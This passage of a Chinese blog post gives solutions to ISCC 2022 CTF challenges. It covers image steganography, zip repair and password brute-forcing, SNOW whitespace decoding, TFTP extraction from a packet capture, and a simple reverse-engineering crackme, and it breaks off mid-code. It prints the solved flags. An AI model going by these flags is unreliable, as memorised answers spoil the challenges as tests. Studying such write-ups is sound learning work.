    <content type="html"><![CDATA[<p>ISCC 2022 中 单板小将苏翊鸣、 藏在星空中的诗、降维打击、2022冬奥会、真相只有一个、GetTheTable与Amy’s Code 的题解</p><span id="more"></span><p>时间挺长的，但是没啥时间来玩。话说为什么没有Crypto方向的</p><h1 id="misc"><a class="markdownIt-Anchor" href="#misc"></a> Misc</h1><h2 id="单板小将苏翊鸣"><a class="markdownIt-Anchor" href="#单板小将苏翊鸣"></a> 单板小将苏翊鸣</h2><p>下载附件后打开，是一张图片和一个压缩包。压缩包加密了，很明显密码应该在图片里。</p><p>图片属性和压缩包注释里面都没有有用的信息。用binwalk和foremost也没有分出来东西。</p><figure class="highlight less"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-tag">Ih</span>Ð<span class="hljs-selector-tag">EDDDDDDf</span>�<span class="hljs-selector-tag">t</span>‘€]<span class="hljs-selector-tag">DDDDDDd</span> <span class="hljs-selector-tag">A</span>™<span class="hljs-selector-tag">h</span>Ð<span class="hljs-selector-tag">EDDDDDDf</span>�<span class="hljs-selector-tag">t</span>‘€]<span class="hljs-selector-tag">DDDDDDd</span> <span class="hljs-selector-tag">A</span>™<span class="hljs-selector-tag">h</span>Ð<span class="hljs-selector-tag">EDDDDDDf</span>�<span class="hljs-selector-tag">t</span>‘€]<span class="hljs-selector-tag">DDDDDDd</span> <span class="hljs-selector-tag">A</span>™<span class="hljs-selector-tag">h</span>Ð<span class="hljs-selector-tag">EDDDDDDf</span>�<span class="hljs-selector-tag">t</span>‘€]<span class="hljs-selector-tag">DDDDDDd</span> <span class="hljs-selector-tag">A</span>™<span class="hljs-selector-tag">h</span>Ð<span class="hljs-selector-tag">EDDDDDDf</span>�<span class="hljs-selector-tag">t</span>‘€]<span class="hljs-selector-tag">DDDDDDd</span> <span class="hljs-selector-tag">A</span>™<span class="hljs-selector-tag">h</span>Ð<span class="hljs-selector-tag">EDDDDDDf</span>�<span class="hljs-selector-tag">t</span>‘€]<span class="hljs-selector-tag">DDDDDDd</span> <span class="hljs-selector-tag">A</span>™<span class="hljs-selector-tag">h</span>Ð<span class="hljs-selector-tag">EDDDDDDf</span>�<span class="hljs-selector-tag">t</span>‘€]<span class="hljs-selector-tag">DDDDDDd</span> <span class="hljs-selector-tag">A</span>™<span class="hljs-selector-tag">h</span>Ð<span class="hljs-selector-tag">EDDDDDDf</span>�<span class="hljs-selector-tag">t</span>‘€]<span class="hljs-selector-tag">DDDDDDd</span> <span class="hljs-selector-tag">A</span>™<span class="hljs-selector-tag">h</span>Ð<span class="hljs-selector-tag">EDDDDDDf</span>�<span class="hljs-selector-tag">t</span>‘€]<span class="hljs-selector-tag">DDDDDDd</span> <span class="hljs-selector-tag">A</span>™<span class="hljs-selector-tag">h</span>Ð<span class="hljs-selector-tag">EDDDDDDf</span>�<span class="hljs-selector-tag">t</span>‘€]<span class="hljs-selector-tag">DDDDDDd</span> <span class="hljs-selector-tag">A</span>™<span class="hljs-selector-tag">h</span>Ð<span class="hljs-selector-tag">EDDDDDDf</span>�<span class="hljs-selector-tag">t</span>‘€]<span class="hljs-selector-tag">DDDDDDd</span> <span class="hljs-selector-tag">A</span>™<span class="hljs-selector-tag">h</span>Ð<span class="hljs-selector-tag">EDDDDDDf</span>�<span class="hljs-selector-tag">t</span>‘€]<span class="hljs-selector-tag">DDDDDDd</span> <span class="hljs-selector-tag">A</span>™<span class="hljs-selector-tag">h</span>Ð<span class="hljs-selector-tag">EDDDDDDf</span>�<span class="hljs-selector-tag">t</span>‘€]<span class="hljs-selector-tag">DDDDDDd</span> <span class="hljs-selector-tag">A</span>™<span class="hljs-selector-tag">h</span>Ð<span class="hljs-selector-tag">EDDDDDDf</span>�<span class="hljs-selector-tag">t</span>‘€]<span class="hljs-selector-tag">DDDDDDd</span> <span class="hljs-selector-tag">A</span>™<span class="hljs-selector-tag">h</span>Ð<span class="hljs-selector-tag">EDDDDDD</span>þä<span class="hljs-selector-tag">t</span>:ÿ<span class="hljs-selector-tag">q</span>˜<span class="hljs-number">9</span>ñïÕ����<span class="hljs-selector-tag">IEND</span>®<span class="hljs-selector-tag">B</span>`‚<br></code></pre></td></tr></table></figure><p>用二进制查看器看看里面的内容，发现尾部有一些数据有点规律。而且这个数据是在图片的结束符之前的。所以可以看出来图像藏了东西，把图像的高改大一点就行。</p><p>改完之后图像出现了一个二维码。扫描。</p><p>得到内容：</p><figure class="highlight clojure"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clojure"><span class="hljs-character">\u5728</span><span class="hljs-character">\u8fd9</span><span class="hljs-character">\u6b21</span><span class="hljs-character">\u51ac</span><span class="hljs-character">\u5965</span><span class="hljs-character">\u4f1a</span><span class="hljs-character">\u7684</span><span class="hljs-character">\u821e</span><span class="hljs-character">\u53f0</span><span class="hljs-character">\u4e0a</span><span class="hljs-character">\uff0c</span><span class="hljs-character">\u6211</span><span class="hljs-character">\u56fd</span><span class="hljs-character">\u5c0f</span><span class="hljs-character">\u5c06</span><span class="hljs-character">\u82cf</span><span class="hljs-character">\u7fca</span><span class="hljs-character">\u9e23</span><span class="hljs-character">\u65a9</span><span class="hljs-character">\u83b7</span><span class="hljs-character">\u4e00</span><span class="hljs-character">\u91d1</span><span class="hljs-character">\u4e00</span><span class="hljs-character">\u94f6</span><span class="hljs-character">\uff0c</span><span class="hljs-character">\u90a3</span><span class="hljs-character">\u4f60</span><span class="hljs-character">\u77e5</span><span class="hljs-character">\u9053</span><span class="hljs-character">\u6b64</span><span class="hljs-character">\u6b21</span><span class="hljs-character">\u51ac</span><span class="hljs-character">\u5965</span><span class="hljs-character">\u4f1a</span><span class="hljs-character">\u6211</span><span class="hljs-character">\u56fd</span><span class="hljs-character">\u603b</span><span class="hljs-character">\u5171</span><span class="hljs-character">\u83b7</span><span class="hljs-character">\u5f97</span><span class="hljs-character">\u51e0</span><span class="hljs-character">\u679a</span><span class="hljs-character">\u5956</span><span class="hljs-character">\u724c</span><span class="hljs-character">\u5417</span><span class="hljs-character">\uff1f</span><span class="hljs-character">\u53c8</span><span class="hljs-character">\u5206</span><span class="hljs-character">\u522b</span><span class="hljs-character">\u662f</span><span class="hljs-character">\u51e0</span><span class="hljs-character">\u91d1</span><span class="hljs-character">\u51e0</span><span class="hljs-character">\u94f6</span><span class="hljs-character">\u51e0</span><span class="hljs-character">\u94dc</span><span class="hljs-character">\u5462</span><span class="hljs-character">\uff1f</span><br></code></pre></td></tr></table></figure><p>这是unicode编码。转换一下得到：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">在这次冬奥会的舞台上，我国小将苏翊鸣斩获一金一银，那你知道此次冬奥会我国总共获得几枚奖牌吗？又分别是几金几银几铜呢？<br></code></pre></td></tr></table></figure><p>百度一下奥运奖牌榜。按照顺序进行组合。即可得到压缩包的密码。解压即可得到flag。</p><h2 id="藏在星空中的诗"><a class="markdownIt-Anchor" href="#藏在星空中的诗"></a> 藏在星空中的诗</h2><p>下载附件。得到三个文件。一个psd文件。一个压缩包。一个文本文件。文本文件内容如下：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs">1：☆✪٭☪✲<br>2：✡🟇⍟⍟✸<br>3：🌠⍟🌟✡🟉<br>4：🟃🟀✪🟀⚝<br>5：✪🟔⍣☆🞱<br></code></pre></td></tr></table></figure><p>emmm… 全是特殊字符。压缩包带密码了，我们需要找到压缩包的密码是多少。</p><p>打开psd文件。发现里面有两个图层。第一个图层不透明度为5%。调整到100%。发现了一个五角星。表示的顺序为：</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">1 </span>-&gt; <span class="hljs-number">3</span> -&gt; <span class="hljs-number">5</span> -&gt; <span class="hljs-number">2</span> -&gt; <span class="hljs-number">4</span> -&gt; <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>构成一个五角星。这里一开始以为最后还要回到1，后来发现不用。</p><p>压缩包的密码就是文本文件中的那几行标号按照提示的顺序组合。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">☆✪٭☪✲🌠⍟🌟✡🟉✪🟔⍣☆🞱✡🟇⍟⍟✸🟃🟀✪🟀⚝<br></code></pre></td></tr></table></figure><p>解压后得到一个Excel文件。</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs subunit">A٭ U<span class="hljs-string">+066</span>D<br>B≛U<span class="hljs-string">+225</span>B<br>C⍟U<span class="hljs-string">+235</span>F<br>D⍣U<span class="hljs-string">+2363</span><br>E★U<span class="hljs-string">+2605</span><br>F☆U<span class="hljs-string">+2606</span><br>G☪U<span class="hljs-string">+262</span>A<br>H⚝U<span class="hljs-string">+269</span>D<br>I✡U<span class="hljs-string">+2721</span><br>J✦U<span class="hljs-string">+2726</span><br>K✧U<span class="hljs-string">+2727</span><br>L✪U<span class="hljs-string">+272</span>A<br>M✫U<span class="hljs-string">+272</span>B<br>N✮U<span class="hljs-string">+272</span>E<br>O✯U<span class="hljs-string">+272</span>F<br>P✴U<span class="hljs-string">+2734</span><br>Q🌟U<span class="hljs-string">+1</span>F31F<br>R🟌U<span class="hljs-string">+1</span>F7CC<br>S🟇U<span class="hljs-string">+1</span>F7C7<br>T🌠U<span class="hljs-string">+1</span>F320<br>U🟉U<span class="hljs-string">+1</span>F7C9<br>V🟀U<span class="hljs-string">+1</span>F7C0<br>W🟃U<span class="hljs-string">+1</span>F7C3<br>X🟆U<span class="hljs-string">+1</span>F7C6<br>Y🟐U<span class="hljs-string">+1</span>F7D0<br>Z🟔U<span class="hljs-string">+1</span>F7D4<br>=✲U<span class="hljs-string">+2732</span><br>&#123;✸U<span class="hljs-string">+2738</span><br>&#125;🞱U<span class="hljs-string">+1</span>F7B1<br><br></code></pre></td></tr></table></figure><p>然后把文本文件里面的字符按照表里给的对应英文字母替换即可。最后结果为：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-number">1</span>：FLAG<span class="hljs-operator">=</span><br><span class="hljs-number">2</span>：ISCC&#123;<br><span class="hljs-number">3</span>：TCQIU<br><span class="hljs-number">4</span>：WVLVH<br><span class="hljs-number">5</span>：LZDF&#125;<br></code></pre></td></tr></table></figure><h2 id="降维打击"><a class="markdownIt-Anchor" href="#降维打击"></a> 降维打击</h2><p>这题写的我真的是很难受。最后一部分整了半天。</p><p>flag格式：ISCC{xxxx-xxxx-xxxx}</p><p>首先下载附件，解压得到一个图片。</p><p><img src="https://s2.loli.net/2022/05/02/pbCsNHajOFcqfyY.png" alt="misc-DimensionalityReductionStrike-19" /></p><p>啊，是伊雷娜。</p><p>用binwalk看看有没有文件。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell">└─$ binwalk misc-DimensionalityReductionStrike-19.png <br><br>DECIMAL       HEXADECIMAL     DESCRIPTION<br>--------------------------------------------------------------------------------<br>0             0x0             PNG image, 1192 x 1656, 8-bit colormap, non-interlaced<br>882           0x372           Zlib compressed data, best compression<br>290500        0x46EC4         PNG image, 200 x 400, 8-bit/color RGB, non-interlaced<br>290541        0x46EED         Zlib compressed data, default compression<br></code></pre></td></tr></table></figure><p>可以看到这里是有东西的。有一个200*400大小的图像文件。但是binwalk提不出来…所以就换foremost来提了。</p><p><img src="https://s2.loli.net/2022/05/02/sulnctUJ14kD2O5.png" alt="00000567" /></p><p>可以看到提出来的图片是这样的。算是二值图像了。结合题目降维打击，应该是要我把这个图像展开为一维了。按行展开肯定不行，因为有一半都是纯黑色，提取出来的数据没有关联。稍微看了下列展开的结果。如果把像素值255表示为1的话。前面几个像素点的转换结果刚好是8950。这是PNG文件的文件头。看来方向对了。</p><p>写个脚本提一下数据：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># extract.py</span><br><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><span class="hljs-keyword">from</span> libnum <span class="hljs-keyword">import</span> b2s<br><br>img = Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">r&quot;00000567.png&quot;</span>)<br><br>weight, height = img.size<br>img_gray = img.convert(<span class="hljs-string">&quot;L&quot;</span>)<br><br>bin_data = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(weight):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(height):<br>        <span class="hljs-keyword">if</span> img_gray.getpixel((i,j)) == <span class="hljs-number">255</span>:<br>            bin_data.append(<span class="hljs-string">&quot;1&quot;</span>)<br>        <span class="hljs-keyword">else</span> :<br>            bin_data.append(<span class="hljs-string">&quot;0&quot;</span>)<br><br>data = <span class="hljs-string">&quot;&quot;</span>.join(bin_data)<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">r&quot;data.png&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>) <span class="hljs-keyword">as</span> fp:<br>    fp.write(b2s(data))<br></code></pre></td></tr></table></figure><p>提取出来的数据可以作为图像阅读。</p><p><img src="https://s2.loli.net/2022/05/02/e6OXdwMmx1U58Q9.png" alt="data" /></p><p>到这里看的我一头雾水。这是什么图像密码。我都没见过，找了一圈图形密码，就是没找到和这个类似的。</p><p>想起原图是伊雷娜的图，不会是魔女之旅里面的文字吧？</p><p>百度了一下没想带还真有…</p><p><a href="https://www.bilibili.com/video/BV1Gq4y1g7yw?spm_id_from=333.999.0.0">https://www.bilibili.com/video/BV1Gq4y1g7yw?spm_id_from=333.999.0.0</a></p><p><img src="https://s2.loli.net/2022/05/02/N4TitScG2dek19V.png" alt="image-20220502221726137" /></p><p>然后我就遇到了这道题最大的难点（对我来说）。我找不到对应的字母。或者说找到的都不对。能确定的是C、K、I(i)、U和N。其他的不知道对应哪一个。</p><p>后面又找了一个：<a href="https://www.bilibili.com/read/cv8724055/">https://www.bilibili.com/read/cv8724055/</a></p><p>得到答案为：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs">fckziuurqknf或者fckziuurpknf<br>zckfiuurqknz或者zckfiuurpknz<br></code></pre></td></tr></table></figure><p>然后按照格式提交上去不对…我很想直到出题人是怎么写的这几个字…</p><p>最后尝试了这个</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">ISCC</span><span class="hljs-template-variable">&#123;FCKZ-IUUR-PKNF&#125;</span><br></code></pre></td></tr></table></figure><p>结果过了。</p><p>…</p><p>让我们回到题目的flag格式：</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">flag格式：ISCC</span><span class="hljs-template-variable">&#123;xxxx-xxxx-xxxx&#125;</span><br></code></pre></td></tr></table></figure><p>作者你这不是坑爹吗。</p><h2 id="2022冬奥会"><a class="markdownIt-Anchor" href="#2022冬奥会"></a> 2022冬奥会</h2><div class="note note-info">            <p>于2022-05-11新增</p>          </div><p>与单板小将苏翊鸣题解一致。修改图片高度。得到信息：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-symbol">&amp;#x51b0;</span><span class="hljs-symbol">&amp;#x58a9;</span><span class="hljs-symbol">&amp;#x58a9;</span><span class="hljs-symbol">&amp;#x7684;</span><span class="hljs-symbol">&amp;#x5c0f;</span><span class="hljs-symbol">&amp;#x4f19;</span><span class="hljs-symbol">&amp;#x4f34;</span><span class="hljs-symbol">&amp;#x7ecf;</span><span class="hljs-symbol">&amp;#x5e38;</span><span class="hljs-symbol">&amp;#x88ab;</span><span class="hljs-symbol">&amp;#x4eba;</span><span class="hljs-symbol">&amp;#x51b7;</span><span class="hljs-symbol">&amp;#x843d;</span><span class="hljs-symbol">&amp;#xff0c;</span><span class="hljs-symbol">&amp;#x4f60;</span><span class="hljs-symbol">&amp;#x77e5;</span><span class="hljs-symbol">&amp;#x9053;</span><span class="hljs-symbol">&amp;#x5b83;</span><span class="hljs-symbol">&amp;#x7684;</span><span class="hljs-symbol">&amp;#x539f;</span><span class="hljs-symbol">&amp;#x578b;</span><span class="hljs-symbol">&amp;#x662f;</span><span class="hljs-symbol">&amp;#x4ec0;</span><span class="hljs-symbol">&amp;#x4e48;</span><span class="hljs-symbol">&amp;#x5417;</span><span class="hljs-symbol">&amp;#xff1f;</span><br></code></pre></td></tr></table></figure><p>unicode编码，问的是雪容融的原型是什么。答案是灯笼。</p><h2 id="真相只有一个"><a class="markdownIt-Anchor" href="#真相只有一个"></a> 真相只有一个</h2><div class="note note-info">            <p>于2022-05-12新增</p>          </div><p>下载文件。里面有一张图片，一个文本，一个未知文件。</p><p>文本里面包含了很多的空白字符，空格制表符啥的。应该是snow隐写。试了一下直接用snow提取：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell">F:\CTFTools\隐写\SNOW&gt;SNOW.EXE <span class="hljs-literal">-C</span> F:\Download\CTF\ISCC2022\真相只有一个\flag.txt<br><span class="hljs-built_in">h</span><br> bn1aagwanter <span class="hljs-built_in">h</span>:lwse<br></code></pre></td></tr></table></figure><p>看样子不是什么有用的东西。应该是要密码。</p><p>图片打开的时候报了一个CRC错误的警告。这个应该是图像的宽度或者高度被修改了才会出现的。但是原图像没有失真扭曲，所以应该是高度被修改了。把高度改大一点，左下角出现了摩斯密码。翻译一下。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">-.<span class="hljs-regexp">/---/</span>-<span class="hljs-regexp">/..../</span>.<span class="hljs-regexp">/.-./</span>.<br>nothere<br></code></pre></td></tr></table></figure><p>嗯…这个可能是密码，但也不一定，尝试用这个密码解snow。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell">F:\CTFTools\隐写\SNOW&gt;SNOW.EXE <span class="hljs-literal">-C</span> <span class="hljs-literal">-p</span> nothere F:\Download\CTF\ISCC2022\真相只有一个\flag.txt<br>y .bpti   awds1)n.. n  aWarning: residual of <span class="hljs-number">5</span> bits not uncompressed<br></code></pre></td></tr></table></figure><p>失败了，看来这个应该就是提示你flag不在这。</p><p>那么现在就剩下一个文件了。这个文件不知道是什么类型的。先用二进制看看。</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs tap">00<span class="hljs-number"> 00 </span>03<span class="hljs-number"> 04 </span>14<span class="hljs-number"> 00 </span>01<span class="hljs-number"> 00 </span>08<span class="hljs-number"> 00 </span>08 8B<span class="hljs-number"> 49 </span>54<span class="hljs-number"> 87 </span>DA �����‹IT‡Ú<br>DD<span class="hljs-number"> 97 </span>95 D2<span class="hljs-number"> 22 </span>00<span class="hljs-number"> 88 </span>D3 2C<span class="hljs-number"> 00 </span>0D<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>73 74Ý—•Ò&quot;�ˆÓ,� ���st<br>72<span class="hljs-number"> 65 </span>61 6D 2E<span class="hljs-number"> 70 </span>63<span class="hljs-number"> 61 </span>70 6E<span class="hljs-number"> 67 </span>4F<span class="hljs-number"> 15 </span>F0<span class="hljs-number"> 01 </span>EFream.pcapngOðï<br></code></pre></td></tr></table></figure><p>可以看到有个流量包。而且看文件开头的那些数据。14 00 01 00 如果经常做压缩包相关的题的，这个是加密压缩包会出现的特征。所以判断这是一个压缩包，但是缺少了头。所以我们补上即可。修复完之后，再看压缩包内文件PK头部分，也有加密特征，说明这个应该是真加密，我们需要找到对应的密码。</p><p>翻了一圈在图像里面找到了。</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">706173737764efbc 9a313939382f7878  passwd.. <span class="hljs-string">.1998/xx</span><br>2f78782492492492 4924924924924920  <span class="hljs-string">/xx</span>$<span class="hljs-string">.I</span>$. I$<span class="hljs-string">.I</span>$<span class="hljs-string">.I</span> <br>248eda97b24fc049 53b6b6db6db6db6d  $<span class="hljs-string">....O.I</span> S.<span class="hljs-string">..m..m</span><br></code></pre></td></tr></table></figure><p>LSB提一下，看到有个passwd，后面是个日期。这个提示我们密码是个8位数字。所以直接爆破。得到密码19981111。</p><p>解压后得到一个包文件。用wireshark打开看看。可以看到几乎全部是TFTP报文，说明这个里面有个传输的文件。TFTP是不加密的，所以我们直接将文件提取出来。</p><p>菜单选择“文件”，“导出对象”，“TFTP”。可以看到有个password.mp3的文件。选中保存。</p><p>将这个mp3文件放入Audacity。</p><p><img src="https://s2.loli.net/2022/05/12/qKaNGjLQhrtc1Ck.jpg" alt="password" /></p><p>可以看到后方有不规则的波形。是摩斯电码。解密得到isccmisc。这个文件的名字就叫password。所以这个结果应该就是snow的密码。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell">F:\CTFTools\隐写\SNOW&gt;SNOW.EXE <span class="hljs-literal">-C</span> <span class="hljs-literal">-p</span> isccmisc F:\Download\CTF\ISCC2022\真相只有一个\flag.txt<br><span class="hljs-number">94</span>jN<span class="hljs-literal">-itGW-A9OH</span><br></code></pre></td></tr></table></figure><p>得到flag。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">ISCC&#123;<span class="hljs-number">94</span>jN<span class="hljs-literal">-itGW-A9OH</span>&#125;<br></code></pre></td></tr></table></figure><h1 id="reverse"><a class="markdownIt-Anchor" href="#reverse"></a> Reverse</h1><h2 id="amys-code"><a class="markdownIt-Anchor" href="#amys-code"></a> Amy’s Code</h2><p>逆向还没入门，所以挑了简单的题练手。哎，没有师傅带自己学是真的进展缓慢。</p><p>文件下载下来，StuPE看一下是32位程序。</p><p>运行一下。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">Please input flag：wafsafwfaw<br>Wrong!<br></code></pre></td></tr></table></figure><p>看样子是我要自己逆向出flag了。</p><p>IDA打开看看。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main_0</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">char</span> Destination[<span class="hljs-number">520</span>]; <span class="hljs-comment">// [esp+DCh] [ebp-410h] BYREF</span><br>  <span class="hljs-type">char</span> Source[<span class="hljs-number">516</span>]; <span class="hljs-comment">// [esp+2E4h] [ebp-208h] BYREF</span><br><br>  j__printf(aPleaseInputFla);<br>  sub_411717((va_list)<span class="hljs-string">&quot;%s&quot;</span>, (<span class="hljs-type">char</span>)Source);<br>  j__strcpy(Destination, Source);<br>  sub_4115FF(Destination);<br>  <span class="hljs-keyword">if</span> ( sub_411433(Destination) )<br>    j__printf(<span class="hljs-string">&quot;Correct!\n&quot;</span>);<br>  <span class="hljs-keyword">else</span><br>    j__printf(<span class="hljs-string">&quot;Wrong!\n&quot;</span>);<br>  j__system(<span class="hljs-string">&quot;pause&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>流程很简单。</p><p>首先读入，然后进入sub_4115FF这个函数处理一下输入的字符串。然后使用sub_411433函数进行判断。重点应该就是这两个函数了。</p><p>先进入sub_4115FF这个函数看看。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// attributes: thunk</span><br><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">sub_4115FF</span><span class="hljs-params">(<span class="hljs-type">char</span> *Str)</span><br>&#123;<br>  <span class="hljs-keyword">return</span> sub_4128A0(Str);<br>&#125;<br></code></pre></td></tr></table></figure><p>跳转到新函数sub_4128A0。跟进。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">sub_4128A0</span><span class="hljs-params">(<span class="hljs-type">char</span> *Str)</span><br>&#123;<br>  <span class="hljs-type">int</span> result; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [esp+D0h] [ebp-14h]</span><br>  <span class="hljs-type">signed</span> <span class="hljs-type">int</span> v3; <span class="hljs-comment">// [esp+DCh] [ebp-8h]</span><br><br>  v3 = j__strlen(Str);<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; ; ++i )<br>  &#123;<br>    result = i;<br>    <span class="hljs-keyword">if</span> ( i &gt;= v3 )<br>      <span class="hljs-keyword">break</span>;<br>    Str[i] ^= i;<br>  &#125;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><p>这个函数逻辑还是很好理解的。就是把对应字符串的字符异或上他的索引值。</p><p>在到sub_411433函数看看。其跳转到sub_412550了，我们也跟进。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">sub_412550</span><span class="hljs-params">(<span class="hljs-type">char</span> *Str)</span><br>&#123;<br>  <span class="hljs-type">int</span> j; <span class="hljs-comment">// [esp+D0h] [ebp-14Ch]</span><br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [esp+DCh] [ebp-140h]</span><br>  <span class="hljs-type">int</span> v4[<span class="hljs-number">32</span>]; <span class="hljs-comment">// [esp+E8h] [ebp-134h] BYREF</span><br>  <span class="hljs-type">int</span> v5; <span class="hljs-comment">// [esp+168h] 